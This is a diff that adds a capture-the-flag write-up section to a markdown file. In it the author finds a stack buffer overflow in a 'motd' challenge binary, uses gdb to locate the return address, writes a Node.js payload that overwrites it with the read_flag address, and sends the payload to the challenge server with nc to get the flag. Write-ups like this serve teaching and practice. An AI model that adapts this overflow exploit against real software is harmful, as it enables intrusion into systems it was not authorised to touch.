@@ -190,7 +190,7 @@ const flag = [
 
 for (const w of flag) {
     let i = w.length;
-    while (i--) { // Takes care of endianness
+    while (i--) { // Takes care of the endianness
         process.stdout.write(String.fromCharCode(w[i] ^ 0xc7));
     }
 }
@@ -203,3 +203,84 @@ readable text. However, it's clearly the flag after XOR-ing each byte with
 I'm not sure if it's a bug or intentional, but it would make more sense if the
 `secondary_login` function actually validated the input. `shell` is disabled,
 but can it be enabled with some hacking?
+
+## Message of The Day
+
+After playing around a bit with the binary, I noticed that writting a large
+input when setting new user MOTD would cause `SIGSEGV`, which smells like
+buffer overflow vulnerability. 
+
+I then disassembled the binary with Hopper Disassembler like before, and found
+that the function that prints the current user MOTD will pass the string into
+`printf` as first argument. Although this let me easily crash the program, my
+input isn't on the stack, so exploiting this format string vulnerability to
+get the flag is rather difficult.
+
+It's time to investigate whether buffer overflow can be exploited, I checked
+the disassembly and found the instruction address right after reading user
+input is `0x60606173`:
+
+```
+$ gdb motd
+[...]
+
+(gdb) break * 0x60606173
+Breakpoint 1 at 0x60606173
+
+(gdb) run
+[...]
+choice: 2
+Enter new message of the day
+
+New msg: ("A" repeated 0x100 times, the size of the buffer)
+Breakpoint 1, 0x0000000060606173 in set_motd ()
+
+(gdb) x/150xw $sp
+[...]
+0x7ffffffde1c0: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7ffffffde1d0: 0xfffde200      0x00007fff      0x60606373      0x00000000
+[...]
+```
+
+Looks like I need 8 more characters to reach the return address. A quick
+Node.js script can be used to encode the address of `read_flag` function,
+`0x606063a5`:
+
+```JavaScript
+"use strict";
+
+// Reverse to take care of the endianness
+const read_flag_address = [0x60, 0x60, 0x63, 0xa5].reverse();
+
+let payload = [
+    Buffer.from("2"),
+    Buffer.from("\n"),
+
+    Buffer.from("A".repeat(0x108)), Buffer.from(read_flag_address),
+    Buffer.from("\n"),
+
+    Buffer.from("5"),
+    Buffer.from("\n"),
+];
+payload = Buffer.concat(payload);
+
+process.stdout.write(payload);
+```
+
+Let's try it:
+
+```
+$ node exploit | nc motd.ctfcompetition.com 1337
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: Enter new message of the day
+New msg: New message of the day saved!
+Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
+```
+
+Usually smashing the stack like this would cause `SIGABRT`, but apparently the
+binary of this quest is compiled without stack cookies.
